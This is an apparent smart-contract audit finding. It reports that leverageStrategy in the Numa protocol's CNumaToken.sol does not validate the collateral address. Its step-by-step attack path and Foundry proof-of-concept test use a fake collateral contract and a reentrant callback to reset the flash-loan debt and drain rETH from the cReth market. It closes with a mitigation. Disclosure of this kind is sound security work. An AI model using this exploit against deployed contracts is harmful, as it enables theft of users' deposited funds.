# cLST market can be drained using a fake collateral token address in leverageStrategy function

### Summary

The missing validation for `_collateral` in the `leverageStrategy()` function of `CNumaToken.sol` can lead to a drain of rETH in the cReth market, as an attacker can pass a fake collateral token to get a callback to their fake collateral contract in between the execution after the flashborrow.


### Root Cause

Lack of input address validation for `_collateral` cToken address in leverageStrategy function.

### Attack Path

Initial State:
- cReth market has 100 rETH
- 1 rETH = 100 Numa

Attack Steps:

1. Attacker deploys malicious contract (`FakeCollateralToken`) that:
    - Returns rETH address when underlying() is called
    - Implements malicious mint() function.

2. Attacker funds `FakeCollateralToken` with 200 Numa.

3. FakeCollateralToken supplies 100 Numa to cNUMA contract.

4. Attacker calls `cReth.leverageStrategy(20, 80, FakeCollateralToken)`
    - This initiates 80 Numa flash borrow from NumaVault
    - Sets `leverageDebt` = 80 in NumaVault

5. cReth queries FakeCollateralToken.underlying()
    - Returns rETH address instead of expected Numa address

6. So cReth approves 100 rETH to FakeCollateralToken.
8. When cReth calls `FakeCollateralToken.mint()` (callback to attackers contract):
    - Attacker executes nested leverageStrategy(1, 1, cNuma)
    - This overwrites NumaVault's `leverageDebt` from 80 to 0.
    - So attacker don't have to pay 80 flash borrow in the main call.
  
9. During flash loan repayment:
    - cReth approves rETH (wrong token) to NumaVault due to manipulated underlying()
    - But as NumaVault attempts to transferFrom 0 Numa due to overwritten leverageDebt `repayLeverage` will pass without failing due to wrong approval. 


9. Due to the approval in step 6:
    - Attacker's FakeCollateralToken contract will have 100 rETH approval from cReth contract
    - Attacker uses this approval to transfer all 100 rETH from cReth market to his FakeCollateralToken contract


### Impact

1. rETH supplied to cReth Market can be drained.
2. Flashminted Numa will get into supply and stuck in cReth contract.

### PoC
Add this test to `lending.t.sol`
```solidity
    mapping(address => uint256) public balanceOf;
    address public underlying;
    function accrueInterest() public returns (uint) {
        return 0;
    }

    function mint(uint256 amount) public returns (uint) {
        balanceOf[msg.sender] += amount;
        address[] memory t = new address[](1);
        t[0] = address(cNuma);
        comptroller.enterMarkets(t);
        // Calling leverageStrategy inside callback to overwrite leverageDebt value
        numa.approve(address(cReth), 1 ether);
        cReth.leverageStrategy(
            1 ether,
            1 ether,
            CNumaToken(address(cNuma)),
            0
        );
    }

    function transfer(address to, uint256 amount) public {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }


    
    function test_missing_token_validation_drain_bug() public {

        // Supplying some rETH to the cReth market for the attacker to steal
        address supplier = makeAddr("supplier");
        deal({token: address(rEth), to: supplier, give: 100 ether});

        vm.startPrank(supplier);

        rEth.approve(address(cReth), 100 ether);
        cReth.mint(100 ether);

        vm.stopPrank();

        // setting underlying to cReth address
        underlying = address(rEth);
        

        vm.startPrank(userA);

        // Funding the attaker contract with Numa
        numa.transfer(address(this),100 ether);

        // Minting cNUMA
        address[] memory t = new address[](1);
        t[0] = address(cNuma);
        comptroller.enterMarkets(t);

        numa.approve(address(cNuma), 50 ether);
        cNuma.mint(50 ether);

        // Calling leverageStrategy with fake collateral token
        rEth.approve(address(cReth), 10 ether);
        cReth.leverageStrategy(
            10 ether,
            40 ether,
            CNumaToken(address(this)), 
            0
        );

        vm.stopPrank();
       
       uint allowance = rEth.allowance(address(cReth),address(this));
       // Transferring funds from cReth to attacker contract
       rEth.transferFrom(address(cReth),address(this),allowance);
    }
```


### Mitigation

Validate the supplied `_collateral` address in the `leverageStrategy` and `closeLeverageStrategy` functions.
